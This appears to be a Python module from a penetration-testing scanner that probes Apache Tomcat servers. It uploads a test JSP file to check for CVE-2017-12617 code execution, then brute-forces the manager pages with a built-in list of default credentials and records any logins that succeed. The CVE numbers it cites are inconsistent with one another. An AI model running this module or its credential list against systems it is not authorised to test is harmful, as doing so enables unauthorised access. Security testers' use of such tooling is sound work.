import os.path

from utils.output import Output
from utils.db import DB
from utils.utils import gen_random_string, gen_bruteforce_creds
from lib.httpscan.http import HTTP

creds = [
    "admin:admin",
    "admin:tomcat",
    "tomcat:tomcat",
    "tomcat:manager",
    "tomcat:cattom",
    "role1:role1",
    "manager:",
    "manager:tomcat",
    "manager:s3cret",
    "j2deployer:j2deployer",
    "ovwebusr:OvW*busr1",
    "cxsdk:kdsxc",
    "root:owaspbwa",
    "ADMIN:ADMIN",
    "xampp:xampp",
    "tomcat:s3cret",
    "QCC:QLogic66",
    "admin:vagrant",
    "root:root",
    "role:changethis",
    "tomcat:changethis",
    "admin:j5Brn9",
    "role1:tomcat",
]

class Module:
    name = 'Tomcat'
    description = 'Discover and exploit tomcat (default password, CVE-2017-12615, TODO: CVE-2020-1938)'

    def run(self, target, args, useragent, proxy, timeout):
        http = HTTP(target['method'], target['hostname'], target['port'], useragent, proxy, timeout)

        tomcat_urls = ['manager/html', 'admin/html']

        # Try CVE-2017-12617
        random_str = gen_random_string()
        payload='<%% out.println("%s");%%>' % random_str
        data = http.put(os.path.join(target['path'], "%s.jsp" % random_str) + "/", data=payload)

        if data['code'] in [201]:
            data = http.get(os.path.join(target['path'], "%s.jsp" % random_str))

            if random_str in data['html'] and not payload in data['html']:
                Output.write({'target': http.url(target['path']), 'message': 'Vulnerable to Apache Tomcat RCE (CVE-2017-12617)'})

                vuln_info = {
                    'hostname': target['hostname'],
                    'port': target['port'],
                    'service': 'http',
                    'url': http.url(target['path']),
                    'name': 'Apache Tomcat RCE (CVE-2017-12617)',
                    'description': 'Server %s vulnerable to Apache Tomcat RCE (CVE-2017-12612)' % http.url(target['path']),
                }
                DB.insert_vulnerability(vuln_info)

        for url in tomcat_urls:
            output = http.get(os.path.join(target['path'], url))

            if not output['code'] in [401] or not 'tomcat' in output['title'].lower():
                continue

            http_info = {
                'hostname': target['hostname'],
                'port': target['port'],
                'protocol': 'tcp',
                'service': 'http',
                'url': http.url(os.path.join(target['path'], url)),
                'http': {
                    'path': os.path.join(target['path'], url),
                    'code': output['code'],
                    'server': output['server'],
                    'title': output['title'],
                    'content-type': output['content-type'],
                },
                'tags': ['tomcat']
            }
            DB.insert_http_url(http_info)

            output['message_type'] = 'http'
            output['target'] = http.url(os.path.join(target['path'], url))
            Output.write(output)

            try:
                auth_type = output['auth_type']

                if args['bruteforce']:
                    Output.write({'target': http.url(os.path.join(target['path'], url)), 'message': 'Starting bruteforce...'})
                    for cred in gen_bruteforce_creds(args['bruteforce'], creds):
                        username, password = cred.split(':')

                        output = http.get(os.path.join(target['path'], url), auth=(auth_type, username, password))

                        if output['code'] in [200]:
                            Output.write({'target': http.url(os.path.join(target['path'], url)), 'message': 'Authentication success with login %s and password %s' % (username, password)})

                            cred_info = {
                                'hostname': target['hostname'],
                                'port': target['port'],
                                'service': 'http',
                                'url': http.url(os.path.join(target['path'], url)),
                                'type': 'password',
                                'username': username,
                                'password': password,
                                'tags': ['tomcat'],
                            }
                            DB.insert_credential(cred_info)

            except KeyError:
                pass





